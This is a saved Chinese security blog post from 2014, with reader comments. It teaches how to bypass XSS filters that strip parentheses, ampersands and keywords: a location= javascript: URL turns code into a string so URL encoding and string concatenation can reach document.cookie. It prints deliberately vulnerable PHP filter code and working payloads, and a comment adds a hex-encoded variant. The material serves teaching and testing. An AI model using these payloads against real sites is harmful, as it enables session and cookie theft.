@@ -1,0 +1,277 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+<meta content="phithon的小站，长期存在与分享关于网络安全与各种编程的原创文章。" name="description"/>
+<meta content="网络安全,代码审计,信息安全,漏洞挖掘,php,C++,mysql,python" name="keywords"/>
+<link href="./利用location来变形我们的XSS Payload  离别歌/favicon.ico" rel="shortcut icon"/>
+<link href="./利用location来变形我们的XSS Payload  离别歌/favicon-192x192.png" rel="icon" sizes="192x192" type="image/png"/>
+<link href="./利用location来变形我们的XSS Payload  离别歌/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
+<title>利用location来变形我们的XSS Payload | 离别歌</title>
+<link href="./利用location来变形我们的XSS Payload  离别歌/font-awesome.min.css" rel="stylesheet"/>
+<link href="./利用location来变形我们的XSS Payload  离别歌/styles.css" rel="stylesheet"/>
+<link href="./利用location来变形我们的XSS Payload  离别歌/style.css" rel="stylesheet"/>
+<link href="./利用location来变形我们的XSS Payload  离别歌/flexboxgrid.min.css" rel="stylesheet"/>
+<link href="./利用location来变形我们的XSS Payload  离别歌/feed" rel="alternate" title="离别歌" type="application/atom+xml">
+<script src="./利用location来变形我们的XSS Payload  离别歌/jquery.min.js"></script>
+<link href="./利用location来变形我们的XSS Payload  离别歌/code.css" rel="stylesheet"/>
+<link href="./利用location来变形我们的XSS Payload  离别歌/button.css" rel="stylesheet"/>
+<link href="./利用location来变形我们的XSS Payload  离别歌/pagination.css" rel="stylesheet"/>
+<link href="./利用location来变形我们的XSS Payload  离别歌/jquery.fancybox.min.css" rel="stylesheet"/>
+</link></meta></head>
+<body>
+<div id="header-post">
+<a class="active" href="#" id="menu-icon"><i class="fa fa-bars fa-lg"></i></a>
+<a class="active" href="#" id="menu-icon-tablet"><i class="fa fa-bars fa-lg"></i></a>
+<a href="#" id="top-icon-tablet" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+<span id="menu" style="visibility: visible">
+<span id="nav">
+<ul>
+<li><a href="/">主页</a></li>
+<li><a href="javascript:history.back(-1)">返回</a></li>
+</ul>
+</span>
+<br/>
+<span id="actions">
+<ul>
+<li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i aria-hidden="true" class="fa fa-chevron-up" onmouseout="$('#i-top').toggle();" onmouseover="$('#i-top').toggle();"></i></a></li>
+<li><a class="icon" href="#"><i aria-hidden="true" class="fa fa-share-alt" onclick="$('#share').toggle();return false;" onmouseout="$('#i-share').toggle();" onmouseover="$('#i-share').toggle();"></i></a></li>
+</ul>
+<span class="info" id="i-top" style="display:none;">Back to top</span>
+<span class="info" id="i-share" style="display:none;">Share post</span>
+</span>
+<br/>
+<div id="share" style="display: none">
+<ul>
+<li><a class="icon" href="http://www.facebook.com/sharer.php?u=https%3A//www.leavesongs.com/PENETRATION/use-location-xss-bypass.html"><i aria-hidden="true" class="fa fa-facebook "></i></a></li>
+<li><a class="icon" href="https://twitter.com/share?url=https%3A//www.leavesongs.com/PENETRATION/use-location-xss-bypass.html&amp;text=%E5%88%A9%E7%94%A8location%E6%9D%A5%E5%8F%98%E5%BD%A2%E6%88%91%E4%BB%AC%E7%9A%84XSS%20Payload"><i aria-hidden="true" class="fa fa-twitter "></i></a></li>
+<li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3A//www.leavesongs.com/PENETRATION/use-location-xss-bypass.html&amp;title=%E5%88%A9%E7%94%A8location%E6%9D%A5%E5%8F%98%E5%BD%A2%E6%88%91%E4%BB%AC%E7%9A%84XSS%20Payload"><i aria-hidden="true" class="fa fa-linkedin "></i></a></li>
+<li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3A//www.leavesongs.com/PENETRATION/use-location-xss-bypass.html&amp;is_video=false&amp;description=%E5%88%A9%E7%94%A8location%E6%9D%A5%E5%8F%98%E5%BD%A2%E6%88%91%E4%BB%AC%E7%9A%84XSS%20Payload"><i aria-hidden="true" class="fa fa-pinterest "></i></a></li>
+<li><a class="icon" href="mailto:?subject=%E5%88%A9%E7%94%A8location%E6%9D%A5%E5%8F%98%E5%BD%A2%E6%88%91%E4%BB%AC%E7%9A%84XSS%20Payload&amp;body=Check out this article: https%3A//www.leavesongs.com/PENETRATION/use-location-xss-bypass.html"><i aria-hidden="true" class="fa fa-envelope "></i></a></li>
+<li><a class="icon" href="https://getpocket.com/save?url=https%3A//www.leavesongs.com/PENETRATION/use-location-xss-bypass.html&amp;title=%E5%88%A9%E7%94%A8location%E6%9D%A5%E5%8F%98%E5%BD%A2%E6%88%91%E4%BB%AC%E7%9A%84XSS%20Payload"><i aria-hidden="true" class="fa fa-get-pocket "></i></a></li>
+<li><a class="icon" href="http://reddit.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/use-location-xss-bypass.html&amp;title=%E5%88%A9%E7%94%A8location%E6%9D%A5%E5%8F%98%E5%BD%A2%E6%88%91%E4%BB%AC%E7%9A%84XSS%20Payload"><i aria-hidden="true" class="fa fa-reddit "></i></a></li>
+<li><a class="icon" href="http://www.stumbleupon.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/use-location-xss-bypass.html&amp;title=%E5%88%A9%E7%94%A8location%E6%9D%A5%E5%8F%98%E5%BD%A2%E6%88%91%E4%BB%AC%E7%9A%84XSS%20Payload"><i aria-hidden="true" class="fa fa-stumbleupon "></i></a></li>
+<li><a class="icon" href="http://digg.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/use-location-xss-bypass.html&amp;title=%E5%88%A9%E7%94%A8location%E6%9D%A5%E5%8F%98%E5%BD%A2%E6%88%91%E4%BB%AC%E7%9A%84XSS%20Payload"><i aria-hidden="true" class="fa fa-digg "></i></a></li>
+<li><a class="icon" href="http://www.tumblr.com/share/link?url=https%3A//www.leavesongs.com/PENETRATION/use-location-xss-bypass.html&amp;name=%E5%88%A9%E7%94%A8location%E6%9D%A5%E5%8F%98%E5%BD%A2%E6%88%91%E4%BB%AC%E7%9A%84XSS%20Payload&amp;description="><i aria-hidden="true" class="fa fa-tumblr "></i></a></li>
+</ul>
+</div>
+</span>
+</div>
+<div class="content index width mx-auto px2 my4">
+<article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header>
+<h1 class="posttitle" itemprop="name headline">利用location来变形我们的XSS Payload</h1>
+<div class="meta">
+<span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+<span itemprop="name">phithon</span>
+</span>
+<div class="postdate">
+<time datetime="2014年7月1日 06:52" itemprop="datePublished">
+                    2014 七月 01 06:52
+                </time>
+</div>
+<div class="article-tag">
+            阅读：6477
+            </div>
+<div class="article-tag">
+<i class="fa fa-bookmark"></i>
+<a class="tag-link" href="/sort/PENETRATION">网络安全</a>
+</div>
+<div class="article-tag">
+<i class="fa fa-tag"></i>
+<a class="tag-link" href="/tag/%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4">绕过过滤</a>,
+                
+                <a class="tag-link" href="/tag/xss">xss</a>
+</div>
+</div>
+</header>
+<div class="content" itemprop="articleBody">
+<p>这篇文章是前段时间从某群中学到的姿势，我分享出来~</p>
+<p>在XSS的时候，有时候有的过滤器很变态，会过滤很多特殊符号和关键词，比如&amp;、(、)、#、'、"，特别是&amp;和括号，少了的话payload很难构造出来。</p>
+<p>举个例子吧，比如过滤器过滤了array("(",")","&amp;","\","&lt;","&gt;","'")，而没有过滤双引号，输出点在&lt;img src="xxxx"&gt;，xxxx这里，怎么构造一个可以利用的XSS Payload？</p>
+<p>过滤代码如下：</p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="nb">header</span><span class="p">(</span><span class="s1">'X-XSS-Protection: 0'</span><span class="p">);</span>
+<span class="nv">$xss</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'xss'</span><span class="p">])</span><span class="o">?</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'xss'</span><span class="p">]</span><span class="o">:</span><span class="s1">''</span><span class="p">;</span>
+<span class="nv">$xss</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">"("</span><span class="p">,</span><span class="s2">")"</span><span class="p">,</span><span class="s2">"&amp;"</span><span class="p">,</span><span class="s2">"</span><span class="se">\\</span><span class="s2">"</span><span class="p">,</span><span class="s2">"&lt;"</span><span class="p">,</span><span class="s2">"&gt;"</span><span class="p">,</span><span class="s2">"'"</span><span class="p">),</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$xss</span><span class="p">);</span>
+<span class="k">echo</span> <span class="s2">"&lt;img src=</span><span class="se">\"</span><span class="si">{</span><span class="nv">$xss</span><span class="si">}</span><span class="se">\"</span><span class="s2">&gt;"</span><span class="p">;</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+<p>所有人肯定都知道，先闭合双引号，后面使用onerror事件触发XSS。输入xss=1" onerror=alert(1)，就可以构造成如下html：</p>
+<div class="codehilite"><pre><span></span>&lt;img src="1" onerror=alert(1)&gt;
+</pre></div>
+<p>可是括号被过滤了怎么办？窗户都弹不出来。</p>
+<p>聪明人可能想到，用html实体来代替括号，变成这样：</p>
+<div class="codehilite"><pre><span></span>&lt;img src="1" onerror=alert&amp;#40;1&amp;#41;&gt;
+</pre></div>
+<p>一样可以弹出。但是，&amp;也被过滤了。有同学可能还想到，用unicode或8进制编码（如<code>\u0028</code>或<code>\50</code>）来绕过，也是不行的，就算没过滤<code>\</code>号，在html属性中也不能直接用这种编码。</p>
+<p>这里涉及到js中关键词(函数名、变量名、保留字等)、字符串、左值与右值的问题，这也是所有语言中都有的问题。</p>
+<p>举个例子，比如<code>test="phithon";</code>，这里test就是左值、变量名，"phithon"就是右值、字符串，<code>=</code>和<code>"</code>是符号。字符串中可以用编码来替换原始字符，比如用<code>\u0028</code>代替左括号<code>(</code>，或用<code>\50</code>来代替左括号<code>(</code>。左值必须是可写的，比如一个变量，我们不能把字符串放在等号左边，因为字符串是一个只读的值。还有，有关于javascript的字符编码，都只能用在字符串中，不能用字符编码去代替符号或变量名、函数名。</p>
+<p>我们要把js中的编码和html中的编码区分开，在html属性中可以用字符实体代替原字符，比如<code>&amp;#40</code>代替<code>(</code>，但js中的unicode与8进制编码，只能放在js中的“字符串”中。比如<code>&lt;img src=1 onerror=alert\u0040\u0041&gt;</code>是不行的，但<code>&lt;img src=1 onerror=alert&amp;#40&amp;#41&gt;</code>可以。</p>
+<p>所以回到我们的测试，根据我之前说的，这些编码在payload里都不能用，因为括号是“符号”，js编码不能替换符号，而html实体又因为过滤了&amp;而不能使用。 </p>
+<p>这里一个小tip就是，我们可以利用location加javascript伪协议，将“符号”、“变量名”、“函数名”统统变成“字符串”，在字符串中我们可以使用所有js里可以使用的编码，去构造payload。 </p>
+<p>怎么变？比如我们可以构造如下payload：</p>
+<div class="codehilite"><pre><span></span>&lt;img src="1" onerror=location="javascript:alert(1)"&gt;
+</pre></div>
+<p>这个时候，alert(1)被放进了字符串里，因为有javascript伪协议，所以也可以执行xss。在字符串中就能够用很多编码了，虽然我们这里过滤了\，但可以用url编码来替代括号，如下payload：</p>
+<div class="codehilite"><pre><span></span>&lt;img src="1" onerror=location="javascript:alert%281%29"&gt;
+</pre></div>
+<p>就能成功绕过上述filter。</p>
+<p>测试一下：http://xxxx/index.php?xss=1"%20onerror%3Dlocation%3D"javascript%3Aalert%25281%2529"%20 </p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201407/13501404176166.jpg"><img alt="05.jpg" src="./利用location来变形我们的XSS Payload  离别歌/thum-13501404176166.jpg"/></a> </p>
+<p>那么，我们把难度提高一点。再拦截一些关键词，比如document，cookie，eval，setTimeout，alert等：</p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="nb">header</span><span class="p">(</span><span class="s1">'X-XSS-Protection: 0'</span><span class="p">);</span>
+<span class="nv">$xss</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'xss'</span><span class="p">])</span><span class="o">?</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'xss'</span><span class="p">]</span><span class="o">:</span><span class="s1">''</span><span class="p">;</span>
+<span class="nv">$xss</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">"("</span><span class="p">,</span><span class="s2">")"</span><span class="p">,</span><span class="s2">"&amp;"</span><span class="p">,</span><span class="s2">"</span><span class="se">\\</span><span class="s2">"</span><span class="p">,</span><span class="s2">"&lt;"</span><span class="p">,</span><span class="s2">"&gt;"</span><span class="p">,</span><span class="s2">"'"</span><span class="p">),</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$xss</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/(script|document|cookie|eval|setTimeout|alert)/'</span><span class="p">,</span> <span class="nv">$xss</span><span class="p">))</span> <span class="p">{</span>
+    <span class="k">exit</span><span class="p">(</span><span class="s1">'bad'</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="k">echo</span> <span class="s2">"&lt;img src=</span><span class="se">\"</span><span class="si">{</span><span class="nv">$xss</span><span class="si">}</span><span class="se">\"</span><span class="s2">&gt;"</span><span class="p">;</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+<p>这时我们怎么能弹出cookie？</p>
+<p>这个时候我们可以用字符串拼接的方式绕过，这也是得益于我们之前将要执行的“函数”变成了“字符串”才有的效果，我们不可能直接<code>&lt;img sec=1 onerror='al'+'er'+t(1)&gt;</code>，js中只有“字符串”才能拼接。</p>
+<p>payload例如：</p>
+<div class="codehilite"><pre><span></span>&lt;img src="1" onerror=location="javascr"+"ipt:al"+"ert%28docu"+"ment.co"+"okie%29"&gt;
+</pre></div>
+<p>用拼接来绕过一些关键词。</p>
+</div>
+</article>
+<div id="reply-list">
+<h1>评论</h1>
+<div class="row" id="comment-2628">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./利用location来变形我们的XSS Payload  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">Homaebic</a>
+<time datetime="2017年4月21日 15:35" itemprop="datePublished">
+                            2017 四月 21 15:35
+                        </time>
+<a href="javascript:reply_to('2628', 'Homaebic')">回复</a>
+</p>
+<p class="comment-meta">师傅巧妙的让协议内容进入一段字符串，这样就避免了url不能编码协议的情况。因此师傅给出的第二种题也可以用同样的方法绕过?xss=1" onerror=location="%6a%61%76%61%73%63%72%69%70%74%3a%61%6c%65%72%74%25281%2529"%20</p>
+</div>
+</div>
+<div class="row" id="comment-2507">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./利用location来变形我们的XSS Payload  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">阿和</a>
+<time datetime="2017年1月12日 17:51" itemprop="datePublished">
+                            2017 一月 12 17:51
+                        </time>
+<a href="javascript:reply_to('2507', '阿和')">回复</a>
+</p>
+<p class="comment-meta">location.href = '//a.com' + location.search;这个BurpSuite会报出开放的重定向，因为域名不可控，可利用空间很小，另外这行代码也没法像PHP输出那样造成XSS，不知道我的看法是不是有问题？</p>
+</div>
+</div>
+<div class="row" id="comment-2314">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./利用location来变形我们的XSS Payload  离别歌/d446e478c923cf509946705f8a38b046.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.leavesongs.com/" target="_blank">WALKER</a>
+<time datetime="2016年3月23日 22:04" itemprop="datePublished">
+                            2016 三月 23 22:04
+                        </time>
+<a href="javascript:reply_to('2314', 'WALKER')">回复</a>
+</p>
+<p class="comment-meta">為什麼可以選用location 求思路 求關鍵字?</p>
+</div>
+</div>
+<div class="row" id="comment-2120">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./利用location来变形我们的XSS Payload  离别歌/e5e441acd8de37332b355d5a8ead7480.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">p1n3</a>
+<time datetime="2015年6月8日 21:57" itemprop="datePublished">
+                            2015 六月 08 21:57
+                        </time>
+<a href="javascript:reply_to('2120', 'p1n3')">回复</a>
+</p>
+<p class="comment-meta">感谢分享！<br><br>前面只能填location=吗？测了下别的window下的变量好像不行<br/><br/>假设"被转义成html实体字符了，还能够闭合双引号吗？</br></br></p>
+</div>
+</div>
+</div>
+<form action="#reply" enctype="multipart/form-data" id="reply" method="post">
+<textarea cols="40" id="id_content" name="content" required="" rows="6">
+</textarea>
+<div class="row">
+<div class="col-xs-4">
+<input id="id_nickname" maxlength="64" name="nickname" placeholder="昵称" required="" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_email" maxlength="254" name="email" placeholder="邮箱（可留空）" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_url" maxlength="200" name="url" placeholder="链接（可留空）" type="text"/>
+</div>
+</div>
+<div class="row" style="margin-top: 8px"><div class="col-xs-4"><input autocomplete="off" id="id_captcha_1" name="captcha_1" placeholder="验证码" type="text"/> <input id="id_captcha_0" name="captcha_0" type="hidden" value="a108b65212760719c3dc3906a505f8c80ad7772b"/>
+</div><div class="col-xs-4">
+<img alt="captcha" class="captcha" height="25" src="./利用location来变形我们的XSS Payload  离别歌/a108b65212760719c3dc3906a505f8c80ad7772b"/></div></div>
+<div class="clearfix"></div>
+<input class="ui-button ui-button-sgreen" type="submit" value="提交"/>
+<input id="id_archive" name="archive" type="hidden" value="319">
+<input id="id_parent" name="parent" type="hidden"/>
+<input name="csrfmiddlewaretoken" type="hidden" value="BSwFrsE1UZldUjlyACGUM89Lpn9AHBtJ9cRbfWQglMfCUYJNoTaElMbQyrCIq5iT"/>
+</input></form>
+</div>
+<footer id="footer">
+<div class="footer-left">
+    Copyright © 2017 Powered by talkbook
+  </div>
+<div class="footer-right">
+<nav>
+<ul>
+<li><a href="/">首页</a></li>
+<li><a href="http://weibo.com/101yx" target="_blank">微博</a></li>
+<li><a href="https://github.com/phith0n" target="_blank">项目</a></li>
+<li><a href="/template/change/">更换模板</a></li>
+</ul>
+</nav>
+</div>
+</footer>
+<script src="./利用location来变形我们的XSS Payload  离别歌/main.js"></script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?ad9ab5e37c2811b9f0979e46123fc898";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<script src="./利用location来变形我们的XSS Payload  离别歌/jquery.fancybox.pack.js"></script>
+<script>
+$(document).ready(function () {
+    $("article a").each(function (i, e) {
+        if(e.host != 'www.leavesongs.com') {
+            e.target = '_blank';
+        }
+    });
+    $("article img").each(function (i, e) {
+        if(e.parentNode.tagName.toUpperCase() != 'A') {
+            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
+        } else {
+            $(e.parentNode).addClass('fancybox');
+        }
+    });
+    $('.fancybox').fancybox();
+})
+</script>
+</body>
+</html>
